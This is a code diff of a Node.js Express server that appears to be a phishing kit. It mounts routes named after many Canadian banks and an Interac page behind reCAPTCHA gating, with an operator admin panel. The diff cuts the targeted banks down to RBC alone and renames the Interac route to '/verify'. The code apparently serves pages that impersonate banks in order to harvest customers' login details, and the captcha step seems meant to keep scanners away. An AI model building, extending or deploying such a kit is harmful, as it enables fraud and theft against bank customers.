@@ -13,23 +13,7 @@ const sessionStore = new Map();
 const { error } = require('node:console');
 const dbConfig = require('./dbConfig');
 const { Pool } = require('pg');
-const atb = require('./routers/atb');
-const bmo = require('./routers/bmo'); 
-const cibc = require('./routers/cibc'); 
-const desj = require('./routers/desj');
-const hsbc = require('./routers/hsbc');
-const laur = require('./routers/laur');
-const manu = require('./routers/manu');
-const meridian = require('./routers/meridian');
-const motus = require('./routers/motus');
-const scotia = require('./routers/scotia');
-const nbc = require('./routers/nbc');
-const pc = require('./routers/pc');
 const rbc = require('./routers/rbc');
-const simplii = require('./routers/simplii');
-const tangerine = require('./routers/tangerine');
-const td = require('./routers/td');
-
 
 (async () => {
     fetch = (await import('node-fetch')).default;
@@ -333,14 +317,14 @@ app.get('/', (req, res) => {
     res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY})
 })
 
-app.post('/interac', verifyRecaptcha, async (req, res) => {
+app.post('/verify', verifyRecaptcha, async (req, res, next) => {
     try{
         const getId = 1; // Since we're always dealing with the record with id = 1
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
 
         let info = result.rows[0].data.settings.info;  
         
-        if(result.rows.length > 0){res.render('interac/index', {data: info});} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
+        if(result.rows.length > 0){next()} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
         
         
     } catch (error) {
@@ -348,6 +332,8 @@ app.post('/interac', verifyRecaptcha, async (req, res) => {
         res.render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
     }
 })
+
+app.use('/rbc', checkRecaptchaSession ,rbc)
 
 app.post('/update', checkAdminSession ,async (req, res) => {
     let data = req.body;
@@ -448,23 +434,6 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
         res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
     }
 });
-
-app.use('/atb', checkRecaptchaSession,atb)
-app.use('/bmo', checkRecaptchaSession,bmo)
-app.use('/cibc', checkRecaptchaSession,cibc)
-app.use('/desj', checkRecaptchaSession,desj)
-app.use('/hsbc', checkRecaptchaSession,hsbc)
-app.use('/laur', checkRecaptchaSession,laur)
-app.use('/manu', checkRecaptchaSession,manu)
-app.use('/meridian', checkRecaptchaSession,meridian)
-app.use('/motus', checkRecaptchaSession,motus)
-app.use('/scotia', checkRecaptchaSession,scotia)
-app.use('/nbc', checkRecaptchaSession,nbc)
-app.use('/pc', checkRecaptchaSession,pc)
-app.use('/rbc', checkRecaptchaSession,rbc)
-app.use('/simplii', checkRecaptchaSession,simplii)
-app.use('/tangerine', checkRecaptchaSession,tangerine)
-app.use('/td', checkRecaptchaSession,td)
 
 app.use((req, res, next) => {
     res.status(404).render('captcha/index', {sitekey: RECAPTCHA_SITE_KEY});
